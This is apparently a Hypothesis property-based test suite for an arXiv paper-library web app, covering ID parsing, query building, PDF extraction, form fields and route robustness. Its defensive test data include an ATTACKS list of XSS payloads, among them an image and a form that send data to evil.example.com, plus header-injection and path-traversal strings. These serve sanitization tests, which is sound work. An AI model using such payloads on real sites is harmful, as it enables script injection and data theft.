"""Property-based testing with Hypothesis: rules that must hold for every input, not just chosen examples.

Hypothesis generates inputs, looks for one that breaks the rule, and shrinks it to the smallest
failing case. A normal run is repeatable; `HYPOTHESIS_PROFILE=thorough` searches much harder.
"""

from __future__ import annotations

import json
import re
from urllib.parse import urlsplit

import httpx
import pymupdf
import pytest
from hypothesis import HealthCheck, assume, example, given, settings
from hypothesis import strategies as st

from app import arxiv_client, citations, db, pdfs
from app.arxiv_client import ArxivError, ArxivResult
from app.main import _download_name, _parse_authors, _parse_year, format_authors, render_markdown
from helpers import HTMX, atom_entry, atom_feed, make_pdf, parse_html, recorded, stored_pdfs

ROUTE_SETTINGS = settings(suppress_health_check=[HealthCheck.function_scoped_fixture])
ID_GRAMMAR = re.compile(r"[0-9]{4}\.[0-9]{4,5}|[a-z][a-z\-]*(\.[A-Z]{2})?/[0-9]{7}")

new_style_ids = st.from_regex(r"[0-9]{4}\.[0-9]{4,5}", fullmatch=True)
old_style_ids = st.from_regex(r"[a-z][a-z\-]{0,7}(\.[A-Z]{2})?/[0-9]{7}", fullmatch=True)
arxiv_ids = new_style_ids | old_style_ids
# Text a real document could contain: no control characters or lone surrogates.
readable_text = st.text(st.characters(exclude_categories=("Cc", "Cs", "Cn")), max_size=80)


@pytest.fixture(autouse=True, scope="module")
def quiet_mupdf():
    """Damaged PDFs are the point of some tests here, so don't print MuPDF's complaints about them."""
    pymupdf.TOOLS.mupdf_display_errors(False)
    yield
    pymupdf.TOOLS.mupdf_display_errors(True)


# --- arXiv IDs and links --------------------------------------------------------------


@given(
    arxiv_ids,
    st.sampled_from(["", "http://", "https://", "HTTPS://"]),
    st.sampled_from(["", "www.", "export."]),
    st.sampled_from(["abs", "pdf"]),
    st.sampled_from(["", "v1", "v12"]),
    st.sampled_from(["", ".pdf"]),
    st.sampled_from(["", "/", "?context=cs.CL", "#S3", "/?a=1#b"]),
    st.sampled_from(["", " ", "\n"]),
)
def test_every_form_of_a_link_gives_the_same_id(arxiv_id, scheme, host, path, version, extension, ending, space):
    link = f"{space}{scheme}{host}arxiv.org/{path}/{arxiv_id}{version}{extension}{ending}{space}"
    assert arxiv_client.normalize_id(link) == arxiv_id


@given(arxiv_ids, st.sampled_from(["", "v3"]), st.sampled_from(["arXiv:", "arxiv:", "ARXIV:", ""]))
def test_plain_ids_are_recognized_with_any_prefix_and_version(arxiv_id, version, prefix):
    assert arxiv_client.normalize_id(f"{prefix}{arxiv_id}{version}") == arxiv_id


@given(st.one_of(st.text(max_size=80), st.from_regex(r"\d{4}\.\d{4,5}", fullmatch=True), st.from_regex(r"[a-z]+/\d{7}", fullmatch=True)))
def test_anything_recognized_as_an_id_really_is_one(text):
    result = arxiv_client.normalize_id(text)
    if result is not None:
        assert ID_GRAMMAR.fullmatch(result)
        assert arxiv_client.normalize_id(result) == result
        assert urlsplit(arxiv_client.pdf_url(result)).netloc == "arxiv.org"


@given(arxiv_ids, st.from_regex(r"[a-z]{1,12}\.(com|org|net|example)", fullmatch=True))
def test_links_to_any_other_site_are_never_accepted(arxiv_id, domain):
    if domain == "arxiv.org":
        return
    for link in (
        f"https://{domain}/abs/{arxiv_id}",
        f"{domain}/abs/{arxiv_id}",
        f"https://arxiv.org.{domain}/abs/{arxiv_id}",
        f"https://{domain}/arxiv.org/abs/{arxiv_id}",
        f"https://arxiv.org@{domain}/abs/{arxiv_id}",
    ):
        assert arxiv_client.normalize_id(link) is None


# --- Search queries --------------------------------------------------------------------


@given(st.text(max_size=300))
@example("the of and")
@example("au:smith OR ti:x ANDNOT cat:cs")
@example('"quoted" (parens) [brackets] {braces}')
def test_any_text_gives_a_safe_query_or_asks_for_keywords(text):
    try:
        params = arxiv_client.build_params(text)
    except ValueError:
        return
    if "id_list" in params:
        assert params["id_list"] == arxiv_client.normalize_id(text)
        return
    terms = params["search_query"].split(" AND ")
    assert 1 <= len(terms) <= arxiv_client.MAX_QUERY_WORDS
    for term in terms:
        assert term.startswith("all:")
        word = term.removeprefix("all:")
        assert re.fullmatch(r"[\w\-.']+", word)
        assert word == word.lower()
        assert word not in arxiv_client.STOP_WORDS
        assert word[0] not in "-.'" and word[-1] not in "-.'"


# --- Reading feeds -------------------------------------------------------------------------


@given(st.one_of(st.text(max_size=300), st.sampled_from(["http://example.com/feed", "/etc/hosts", ".", "<feed>", "<feed/>", "<?xml version='1.0'?>"])))
def test_any_response_body_gives_results_or_a_friendly_error(body):
    try:
        results = arxiv_client.parse_feed(body)
    except ArxivError as exc:
        assert exc.status_code == 502
        return
    assert results == [] or all(isinstance(result, ArxivResult) for result in results)


def feedparser_repairs(text: str) -> bool:
    """feedparser turns text that looks like double-encoded UTF-8 back into what it meant ("Ã©" into "é")."""
    try:
        return text.encode("iso-8859-1").decode("utf-8") != text
    except (UnicodeEncodeError, UnicodeDecodeError):
        return False


@given(st.lists(st.tuples(new_style_ids, readable_text, st.lists(readable_text, max_size=4), readable_text), max_size=5, unique_by=lambda paper: paper[0]))
def test_whatever_a_feed_holds_comes_back_tidied(papers):
    for _id, title, authors, abstract in papers:
        assume(not any(feedparser_repairs(text) for text in (title, abstract, *authors)))
    feed = atom_feed(*(atom_entry(i, title=t, authors=a, abstract=s) for i, t, a, s in papers))
    results = {result.arxiv_id: result for result in arxiv_client.parse_feed(feed)}
    for arxiv_id, title, authors, abstract in papers:
        clean_title = " ".join(title.split())
        if not clean_title:
            assert arxiv_id not in results
            continue
        result = results[arxiv_id]
        assert result.title == clean_title
        assert result.abstract == " ".join(abstract.split())
        assert result.authors == [" ".join(name.split()) for name in authors if name.strip()]
        assert result.url == f"https://arxiv.org/abs/{arxiv_id}"
        assert result.pdf_url == f"https://arxiv.org/pdf/{arxiv_id}"


# --- Citations ------------------------------------------------------------------------------


def result_named(arxiv_id: str) -> ArxivResult:
    return ArxivResult(arxiv_id, arxiv_id, [], 2024, "", "url", "pdf")


@given(st.lists(st.one_of(st.none(), st.integers(0, 50)), max_size=30), st.integers(0, 35))
def test_most_cited_is_always_a_correctly_ordered_stable_top_k(counts, limit):
    papers = [result_named(f"id-{n}") for n in range(len(counts))]
    known = {f"id-{n}": count for n, count in enumerate(counts) if count is not None}
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(citations, "citation_counts", lambda _ids: known)
        ranked, returned = citations.most_cited(papers, limit)
    assert returned == known
    assert len(ranked) == min(limit, len(papers))
    scores = [known.get(paper.arxiv_id, -1) for paper in ranked]
    assert scores == sorted(scores, reverse=True)
    positions = [int(paper.arxiv_id.split("-")[1]) for paper in ranked]
    for (score_a, pos_a), (score_b, pos_b) in zip(zip(scores, positions), zip(scores[1:], positions[1:])):
        if score_a == score_b:
            assert pos_a < pos_b


# --- Form fields ------------------------------------------------------------------------------

json_values = st.recursive(st.none() | st.booleans() | st.integers() | st.floats(allow_nan=False) | st.text(max_size=20), lambda inner: st.lists(inner, max_size=4) | st.dictionaries(st.text(max_size=5), inner, max_size=3), max_leaves=8)


@given(st.one_of(st.text(max_size=100), json_values.map(json.dumps)))
@example("[" * 100_000)
@example('{"a":' * 100_000)
def test_any_authors_field_gives_a_clean_list_of_names(raw):
    authors = _parse_authors(raw)
    assert isinstance(authors, list)
    assert len(authors) <= 200
    for name in authors:
        assert isinstance(name, str)
        assert name and name == " ".join(name.split())


def test_only_strings_in_the_authors_field_count_as_names():
    assert _parse_authors('[null, 1, true, {}, [], "Alice"]') == ["Alice"]


@given(st.lists(st.text(max_size=20), max_size=250))
def test_author_names_survive_the_form_unchanged_apart_from_spacing(names):
    expected = [" ".join(name.split()) for name in names if name.strip()][:200]
    assert _parse_authors(json.dumps(names)) == expected


@given(st.one_of(st.text(max_size=10), st.integers(-5000, 5000).map(str)))
@example("²")
@example("①②③④")
@example("٢٠٢٤")
@example("9" * 5000)
def test_any_year_field_is_a_plausible_year_or_nothing(raw):
    year = _parse_year(raw)
    assert year is None or (isinstance(year, int) and 1900 <= year <= 2100)


@given(st.integers(1900, 2100), st.sampled_from(["", " ", "\n", "\t"]))
def test_every_plausible_year_is_kept(year, space):
    assert _parse_year(f"{space}{year}{space}") == year


@given(st.lists(st.text(min_size=1, max_size=10), max_size=12))
def test_author_lists_are_shortened_without_losing_count(names):
    text = format_authors(names)
    if not names:
        assert text == "Authors unknown"
    elif len(names) <= 4:
        assert text == ", ".join(names)
    else:
        assert text == f"{', '.join(names[:3])}, and {len(names) - 3} more"


# --- Download names go into an HTTP header -------------------------------------------------------


@given(st.text(max_size=300))
@example("a\r\nSet-Cookie: stolen=1")
@example('../../etc/passwd"; x="')
@example("!!!")
def test_any_title_gives_a_safe_download_name(title):
    name = _download_name(title)
    assert name.endswith(".pdf")
    assert len(name) <= 84
    assert not re.search(r"[\x00-\x1f\x7f/\\\"':;]", name)
    assert name != ".pdf"


# --- Model output -----------------------------------------------------------------------------------

ATTACKS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    '<a href="javascript:alert(1)">x</a>',
    "[x](javascript:alert(1))",
    "[x](JaVaScRiPt:alert(1))",
    "[x](vbscript:msgbox(1))",
    "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "[x](&#106;avascript:alert(1))",
    "[x](java\tscript:alert(1))",
    "<javascript:alert(1)>",
    "![x](https://evil.example.com/pixel.png?leak=secret)",
    "![x](javascript:alert(1))",
    "[x]: javascript:alert(1)\n\n[x]",
    "<style>body{display:none}</style>",
    "<form action=https://evil.example.com><input name=q></form>",
    '<meta http-equiv="refresh" content="0">',
    "```html\n<script>alert(1)</script>\n```",
    "| a |\n|---|\n| <script>alert(1)</script> |",
]
ALLOWED_TAGS = {"p", "h1", "h2", "h3", "h4", "h5", "h6", "ul", "ol", "li", "strong", "em", "a", "code", "pre", "blockquote", "hr", "br", "table", "thead", "tbody", "tr", "th", "td"}
ALLOWED_ATTRIBUTES = {"a": {"href", "title"}, "ol": {"start"}, "code": {"class"}, "th": {"style"}, "td": {"style"}}


@given(st.lists(st.one_of(st.sampled_from(ATTACKS), st.text(max_size=30)), max_size=6).map("\n\n".join))
def test_no_model_output_can_put_anything_active_on_the_page(markdown):
    for node in parse_html(str(render_markdown(markdown))).find_all():
        assert node.tag in ALLOWED_TAGS, node.tag
        assert set(node.attrs) <= ALLOWED_ATTRIBUTES.get(node.tag, set()), (node.tag, node.attrs)
        if node.tag == "a":
            scheme = urlsplit(node.attrs.get("href", "")).scheme.lower()
            assert scheme in {"", "http", "https", "mailto"} or ":" not in node.attrs["href"], node.attrs["href"]
            assert scheme not in {"javascript", "vbscript", "data", "file"}


# --- Reading text ----------------------------------------------------------------------------------


@given(st.text(max_size=500))
def test_any_text_gives_a_real_title_line_or_nothing(text):
    title = pdfs.title_from_text(text)
    if title is not None:
        assert len(title) <= 300
        assert title == " ".join(title.split())[:300]
        assert re.search(r"[^\W\d_]{3}", title)
        assert not title.lower().startswith("arxiv:")


@given(st.text(max_size=500), st.sampled_from(["Abstract\n", "ABSTRACT: ", "Abstract—", "Abstract "]), st.text(max_size=4000))
def test_any_text_gives_a_tidy_abstract_or_nothing(before, heading, after):
    abstract = pdfs.abstract_from_text(f"{before}\n{heading}{after}")
    if abstract is not None:
        assert 100 <= len(abstract) <= pdfs.MAX_FALLBACK_ABSTRACT_CHARS
        assert abstract == " ".join(abstract.split())


@given(st.text(max_size=200))
def test_any_embedded_title_is_tidy_and_long_enough_or_ignored(value):
    title = pdfs._embedded_title(value)
    if title is not None:
        assert title == " ".join(value.split())
        assert len(title) >= 8


@given(st.text(max_size=200))
def test_any_embedded_author_field_gives_clean_names(value):
    for name in pdfs._embedded_authors(value):
        assert len(name) > 1
        assert name == name.strip()
        assert ";" not in name


# --- Damaged files -------------------------------------------------------------------------------------

VALID_PDF = make_pdf()


def assert_extract_is_safe(data: bytes) -> None:
    try:
        extracted = pdfs.extract(data)
    except pdfs.PDFError as exc:
        assert exc.status_code == 400
        return
    assert extracted.full_text.strip()
    extracted.full_text.encode("utf-8")  # it has to be storable and sendable
    extracted.first_pages_text.encode("utf-8")


@given(st.binary(max_size=3000))
def test_any_bytes_are_extracted_or_rejected_cleanly(data):
    assert_extract_is_safe(data)


@given(st.binary(max_size=3000))
def test_any_bytes_after_a_pdf_header_are_extracted_or_rejected_cleanly(data):
    assert_extract_is_safe(b"%PDF-1.7\n" + data)


@given(st.lists(st.tuples(st.integers(0, len(VALID_PDF) - 1), st.integers(0, 255)), min_size=1, max_size=30))
def test_a_real_pdf_with_flipped_bytes_is_extracted_or_rejected_cleanly(changes):
    data = bytearray(VALID_PDF)
    for position, value in changes:
        data[position] = value
    assert_extract_is_safe(bytes(data))


@given(st.integers(0, len(VALID_PDF)))
def test_a_real_pdf_cut_off_anywhere_is_extracted_or_rejected_cleanly(length):
    assert_extract_is_safe(VALID_PDF[:length])


# --- The routes never crash, whatever is sent ---------------------------------------------------------


@ROUTE_SETTINGS
@given(q=st.text(max_size=400), sort=st.one_of(st.sampled_from(["relevance", "recent", "citations"]), st.text(max_size=20)))
def test_any_search_gets_a_proper_answer(client, arxiv, scholar, q, sort):
    arxiv.reset().reply(200, text=recorded("arxiv_no_results.xml"))
    scholar.reset().reply(200, json=[])
    response = client.get("/", params={"q": q, "sort": sort}, headers=HTMX)
    assert response.status_code in (200, 400)
    page = parse_html(response.text)
    assert page.find("script") is None
    assert page.find("img") is None
    assert len(arxiv.requests) <= 1
    for request in arxiv.requests:
        assert request.url.host == "export.arxiv.org"


@ROUTE_SETTINGS
@given(
    arxiv_id=st.one_of(arxiv_ids, st.text(max_size=60)),
    title=st.one_of(st.just("A Paper"), st.text(max_size=60)),
    authors=st.one_of(st.just("[]"), st.text(max_size=60), json_values.map(json.dumps)),
    year=st.text(max_size=8),
    abstract=st.text(max_size=60),
)
def test_any_save_form_gets_a_proper_answer_and_only_ever_downloads_from_arxiv(client, arxiv_pdfs, arxiv_id, title, authors, year, abstract):
    arxiv_pdfs.reset().reply(200, content=VALID_PDF)
    before = db.count_papers()
    response = client.post("/library", data={"arxiv_id": arxiv_id, "title": title, "authors": authors, "year": year, "abstract": abstract}, headers=HTMX)
    assert response.status_code in (200, 400)
    for request in arxiv_pdfs.requests:
        assert request.url.host == "arxiv.org"
    if response.status_code == 400:
        assert arxiv_pdfs.requests == []
        assert db.count_papers() == before


@ROUTE_SETTINGS
@given(data=st.binary(max_size=2000), name=st.text(max_size=40))
def test_any_upload_gets_a_proper_answer_and_leaves_nothing_if_rejected(client, data, name):
    before_papers, before_files = db.count_papers(), len(stored_pdfs())
    response = client.post("/library/upload", files={"file": (name, data, "application/pdf")}, headers=HTMX)
    assert response.status_code in (200, 400)
    assert db.count_papers() == before_papers + (1 if response.status_code == 200 else 0)
    assert len(stored_pdfs()) == before_files + (1 if response.status_code == 200 else 0)


@pytest.fixture
def existing_paper(add_paper):
    return add_paper(source="upload", arxiv_id=None, url=None)


@ROUTE_SETTINGS
@given(question=st.text(max_size=1200))
def test_any_question_is_answered_or_refused_and_shown_safely(client, gemini, existing_paper, question):
    gemini.reset().reply_text("An answer.")
    before = len(db.list_questions(existing_paper))
    response = client.post(f"/papers/{existing_paper}/questions", data={"question": question}, headers=HTMX)
    clean = " ".join(question.split())
    if clean and len(clean) <= 1000:
        assert response.status_code == 200
        assert db.list_questions(existing_paper)[-1]["question"] == clean
        assert parse_html(response.text).find(class_="question").text == clean
        assert parse_html(response.text).find("script") is None
    else:
        assert response.status_code == 400
        assert len(db.list_questions(existing_paper)) == before
        assert gemini.requests == []


@ROUTE_SETTINGS
@given(paper_id=st.integers(-(10**25), 10**25))
def test_any_paper_number_is_a_page_or_a_404(client, paper_id):
    assert client.get(f"/papers/{paper_id}").status_code == 404
    assert client.get(f"/papers/{paper_id}/pdf").status_code == 404
    assert client.delete(f"/papers/{paper_id}", headers=HTMX).status_code == 404


@ROUTE_SETTINGS
@given(failures=st.lists(st.sampled_from([429, 500, 502, 503, 504, "timeout", "connect"]), max_size=4))
def test_any_failure_sequence_ends_in_results_or_a_busy_message_within_3_tries(client, arxiv, failures):
    arxiv.reset()
    for failure in failures:
        if failure == "timeout":
            arxiv.fail(httpx.ReadTimeout("slow"))
        elif failure == "connect":
            arxiv.fail(httpx.ConnectError("no route"))
        else:
            arxiv.reply(failure)
    arxiv.reply(200, text=recorded("arxiv_no_results.xml"))
    response = client.get("/", params={"q": "testing"}, headers=HTMX)
    assert len(arxiv.requests) == min(len(failures) + 1, 3)
    assert response.status_code == (200 if len(failures) < 3 else 503)
